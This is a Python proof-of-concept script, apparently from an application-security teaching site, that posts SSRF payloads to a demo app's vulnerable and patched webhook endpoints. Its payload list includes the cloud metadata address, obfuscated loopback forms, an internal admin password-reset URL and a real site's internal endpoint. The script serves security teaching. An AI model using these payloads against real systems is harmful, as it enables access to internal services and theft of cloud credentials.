import requests
import cli

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:5000"

if use_vulnerable_endpoint:
    url = f"{url_prefix}/vulnerabilities/ssrf1/submit_webhook/"
else:
    url = f"{url_prefix}/patches/ssrf1/submit_webhook/"

# This configures the proxy web address if you are using one. Exploit will work regardless of whether you have a proxy enabled or not.
# This also sets verification of the server TLS certificate to false because the endpoint is just for demonstration purposes. Ignore any warnings associated with not verifying the certificate.
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
requests.packages.urllib3.disable_warnings()

# custom_url = "http://127.0.0.1"
# custom_url = "http://localhost"
# custom_url = "http://admin_panel"
# custom_url = "http://admin_panel:8484"
# custom_url = "http://admin_panel:8484/reset_admin_password"
# custom_url = "http://admin_panel:8484/reset_admin_password/"
# custom_url = "https://dzone.com/services/internal/action/dzoneUsers-isUserEmailValidated"
custom_url = "169.254.169.254"
custom_url = "http://74"
custom_url = "https://01111111.00000000.00000000.00000001"
custom_url = "https://google.com"
data = {"custom_url": custom_url}

r = requests.post(url, data=data, verify=verify, proxies=proxies)
print(r.text)
